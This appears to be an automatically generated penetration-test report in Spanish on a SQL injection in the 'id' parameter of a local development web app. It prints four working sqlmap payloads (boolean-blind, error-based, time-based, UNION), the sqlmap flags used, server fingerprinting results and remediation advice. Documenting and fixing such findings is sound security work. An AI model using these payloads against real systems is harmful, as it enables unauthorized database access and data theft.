# Informe de análisis SQLi

Objetivo: http://web.dev.local:8083
Fecha (escaneo): 2026-04-24T06:55:58Z

Resumen ejecutivo:
- Vulnerabilidad encontrada: SÍ
- Vulnerabilidad explotada: SÍ (confirmación de inyección y fingerprinting)

Detalles técnicos:
- Punto vulnerable: parámetro GET "id" en el formulario GET /?id=&Submit=Submit
- Técnicas detectadas por sqlmap: boolean-based blind, error-based, time-based blind, UNION query
- Ejemplos de payloads detectados:
  - Boolean-based: id=5029' AND 6551=(SELECT (CASE WHEN (6551=6551) THEN 6551 ELSE (SELECT 2428 UNION SELECT 1249) END))-- -&Submit=Submit
  - Error-based: id=5029' OR (SELECT 8777 FROM(SELECT COUNT(*),CONCAT(0x71717a6a71,(SELECT (ELT(8777=8777,1))),0x717a716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- mTmP&Submit=Submit
  - Time-based: id=5029' AND (SELECT 7778 FROM (SELECT(SLEEP(5)))JVzb)-- YZiE&Submit=Submit
  - UNION: id=5029' UNION ALL SELECT NULL,CONCAT(0x71717a6a71,0x7266786d565148786279414c49575057486e62576c7a784d474c536d514662424c6c7042556d474b,0x717a716a71)-- -&Submit=Submit

Evidencia y resultado de la explotación:
- sqlmap confirmó el back-end DBMS: MySQL (MariaDB fork)
- Servidor: Apache 2.4.65 sobre Linux Debian
- PHP: 8.1.33
- sqlmap guardó resultados en: /home/kali_rdp/.local/share/sqlmap/output/results-04242026_0856am.csv
- No se descargaron dumps de tablas sensibles durante este análisis automatizado; la explotación se limitó a fingerprinting y pruebas de extracción de información (confirmación).

Recomendaciones:
1. Usar consultas parametrizadas (prepared statements) para el parámetro "id".
2. Validación y saneamiento del input en servidor (tipo entero, limites).
3. Principio de privilegios mínimos en el usuario DB (evitar permisos de INFORMATION_SCHEMA). 
4. Monitorizar y bloquear patrones de inyección con WAF y reglas específicas.
5. Revisar logs y auditar accesos al DB tras pruebas.

Comandos/flags utilizados (sqlmap):
--batch --forms --crawl=1 --level=3 --risk=2 --threads=5

Conclusión:
La aplicación es vulnerable a inyección SQL en el parámetro "id". Se confirmaron múltiples vectores (boolean, error, time, UNION). Se recomienda corregir cuanto antes y repetir pruebas de verificación después de mitigaciones.

---
Informe generado automáticamente por herramienta de análisis.
